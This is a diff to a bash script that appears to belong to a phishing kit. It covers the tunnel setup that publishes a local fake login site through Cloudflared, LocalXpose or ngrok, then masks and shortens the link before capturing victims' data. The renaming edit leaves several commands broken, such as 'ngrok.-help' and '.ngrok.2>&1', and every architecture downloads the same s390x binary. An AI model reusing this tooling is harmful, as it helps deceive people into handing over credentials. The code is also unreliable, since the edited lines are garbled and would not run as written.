@@ -153,7 +153,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx Ngrok"
+	check_PID="php cloudflared loclx ngrok"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -341,21 +341,21 @@ install_localxpose() {
 	fi
 }
 
-## Install Ngrok
-install_Ngrok() {
-	if [[ -e ".server/Ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+## Install ngrok
+install_ngrok() {
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} ngrok.already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
 		else
-			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'Ngrok'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-s390x.tgz' 'ngrok'
 		fi
 	fi
 }
@@ -529,42 +529,42 @@ start_loclx() {
 	custom_url "$loclx_url"
 	capture_data
 }
-Ngrok_auth() {
-	./.server/Ngrok -help > /dev/null 2>&1 &
+ngrok_auth() {
+	./.server/ngrok.-help > /dev/null 2>&1 &
 	sleep 1
-	[ -d ".Ngrok" ] && auth_f=".Ngrok/.access" || auth_f="$HOME/.Ngrok/.access" 
+	[ -d ".ngrok" ] && auth_f=".ngrok/.access" || auth_f="$HOME/.ngrok/.access" 
 
-	[ "$(./.server/Ngrok account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${BLUE}Ngrok.io${GREEN} & copy the token\n"
+	[ "$(./.server/ngrok.account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${BLUE}ngrok.com${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${BLUE} Input Loclx Token :${BLUE} " Ngrok_token
-		[[ $Ngrok_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Token." ; sleep 2 ; tunnel_menu
+		read -p "${RED}[${WHITE}-${RED}]${BLUE} Input ngrok.Token :${BLUE} " ngrok_token
+		[[ $ngrok_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input ngrok.Token." ; sleep 2 ; tunnel_menu
 		} || {
-			echo -n "$Ngrok_token" > $auth_f 2> /dev/null
+			echo -n "$ngrok_token" > $auth_f 2> /dev/null
 		}
 	}
 }
 
-## Start Ngrok (Again...)
-start_Ngrok() {
+## Start ngrok.(Again...)
+start_ngrok() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; Ngrok_auth; }
+	{ sleep 1; setup_site; ngrok_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${BLU} " opinion
-	[[ ${opinion,,} == "y" ]] && Ngrok_region="eu" || Ngrok_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	read -n1 -p "${RED}[${WHITE}?${RED}]${BLU} Change ngrok.Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${BLU} " opinion
+	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching ngrok..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/Ngrok tunnel --raw-mode http --region ${Ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.Ngrok 2>&1 &
+		sleep 1 && termux-chroot ./.server/ngrok.tunnel --raw-mode http --region ${ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.ngrok.2>&1 &
 	else
-		sleep 1 && ./.server/Ngrok tunnel --raw-mode http --region ${Ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.Ngrok 2>&1 &
+		sleep 1 && ./.server/ngrok tunnel --raw-mode http --region ${ngrok_region} --https-redirect -t "$HOST":"$PORT" > .server/.ngrok.2>&1 &
 	fi
 
 	sleep 12
-	loclx_url=$(cat .server/.Ngrok | grep -o '[0-9a-zA-Z.]*.Ngrok.io')
-	custom_url "$Ngrok_url"
+	ngrok_url=$(cat .server/.ngrok.| grep -o '[0-9a-zA-Z.]*.ngrok.com')
+	custom_url "$ngrok_url"
 	capture_data
 }
 
@@ -586,7 +586,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${BLUE} Localhost
 		${RED}[${WHITE}02${RED}]${BLUE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${BLUE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
-		${RED}[${WHITE}04${RED}]${BLUE} Ngrok   ${BLUE}]
+		${RED}[${WHITE}04${RED}]${BLUE} ngrok.${BLUE}]
 
 	EOF
 
@@ -600,7 +600,7 @@ tunnel_menu() {
 		3 | 03)
 			start_loclx;;
 		4 | 04)
-			start_Ngrok;;
+			start_ngrok;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -645,7 +645,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|ngrok.com) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
@@ -972,5 +972,5 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-install_Ngrok
+install_ngrok
 main_menu
